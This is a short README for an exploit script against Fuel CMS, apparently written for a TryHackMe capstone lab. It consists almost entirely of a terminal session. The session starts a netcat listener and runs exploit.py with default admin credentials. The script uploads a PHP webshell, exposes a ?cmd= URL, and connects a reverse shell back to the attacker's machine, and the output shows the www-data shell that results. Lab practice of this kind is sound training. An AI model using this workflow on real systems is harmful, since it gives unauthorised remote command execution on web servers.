# Capstone TryHackMe 

[THM lab "Vulnerability Research" module.](https://tryhackme.com/room/vulnerabilitycapstone)

- Usage
```sh
# Listening on port 4242
┌──(root㉿kali)-[/labs/fuelCMS]
└─# nc -nlvp 4242
listening on [any] 4242 ...

# Sending reverse shell back to attacker
┌──(root㉿kali)-[/labs/fuelCMS]
└─# ./exploit.py --username admin \
    --password admin \
    --lhost 10.13.42.125 \
    --lport 4242 \
    --url 'http://10.10.250.79/fuel' 
[*] Testing creds: Username admin, Password admin
[*] Uploading zip file ad728c55.zip

Got a webshell as user: www-data
go to --> http://10.10.250.79/assets/images/667956ac.php?cmd=whoami

[*] Sending reverse shell to 10.13.42.125:4242


# Got Shell
┌──(root㉿kali)-[/labs/fuelCMS]
└─# nc -nlvp 4242
listening on [any] 4242 ...
connect to [10.13.42.125] from (UNKNOWN) [10.10.250.79] 33822
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ pwd
/var/www/html/fuelcms/assets/images
$ 
```
